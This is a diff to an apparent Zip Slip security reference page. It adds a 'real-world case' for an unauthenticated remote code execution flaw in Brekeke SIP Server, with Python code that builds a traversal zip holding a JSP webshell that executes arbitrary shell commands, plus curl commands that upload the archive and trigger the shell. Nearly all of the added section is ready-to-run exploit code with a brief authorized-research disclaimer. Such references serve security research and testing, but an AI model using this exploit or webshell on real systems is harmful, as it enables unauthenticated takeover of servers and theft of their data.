@@ -42,7 +42,40 @@ When a vulnerable application extracts `malicious.zip`, the files are written to
 
 For a list of affected libraries and projects, visit [snyk/zip-slip-vulnerability](https://github.com/snyk/zip-slip-vulnerability)
 
+### Real-world case — Brekeke SIP Server (unauthenticated webshell RCE)
+
+A self-developed `Zip.extractAll` method in the `ProvisioningModelImport` bean of Brekeke SIP Server (v3.19.1.8p1) performs no `..` filtering or canonical-path validation. A single unauthenticated POST uploading a crafted model archive writes a JSP webshell into the Tomcat webroot, and a single GET triggers it — remote code execution as the `tomcat` user, no credentials, factory default configuration (CVSS 9.8).
+
+Build a malicious zip whose entry traverses out of the model extract root to the webroot:
+
+```python
+import zipfile
+ws = ('<%@ page import="java.io.*" %>'
+      '<% String c = request.getParameter("c");'
+      ' if(c!=null){ Process p = Runtime.getRuntime().exec(new String[]{"sh","-c",c});'
+      ' BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));'
+      ' String l; while((l=br.readLine())!=null) out.println(l); } %>')
+with zipfile.ZipFile("webshell.zip", "w") as z:
+    # 7 layers ../ from etc/pv/models/<model>/ to webapps/sip/ (webroot)
+    z.writestr("../../../../../../../unauth_ws.jsp", ws)
+```
+
+Upload it unauthenticated via the model import endpoint, then trigger the webshell:
+
+```bash
+# Upload (Zip Slip write into webroot) — replace <target_base_url>
+curl -F "operation=import" -F "model=poc" -F "overwrite=true" \
+  -F "modelfile=@webshell.zip;filename=poc.zip" \
+  "<target_base_url>/gate?bean=sipadmin.web.ProvisioningModelImport"
+
+# Trigger
+curl "<target_base_url>/unauth_ws.jsp?c=id"
+```
+
+> Bind test targets to `127.0.0.1`. Authorized security research only.
+
 ## References
 
 * [Zip Slip - Snyk - June 5, 2018](https://web.archive.org/web/20260307012319/https://github.com/snyk/zip-slip-vulnerability)
 * [Zip Slip Vulnerability - Snyk - April 15, 2018](https://web.archive.org/web/20180605125813/https://snyk.io/research/zip-slip-vulnerability)
+* [Brekeke SIP Server Unauthenticated Zip Slip Webshell RCE - 0day Rubbish](https://0day-rubbish.com/blog/brekeke-sip-server-zipslip-rce)
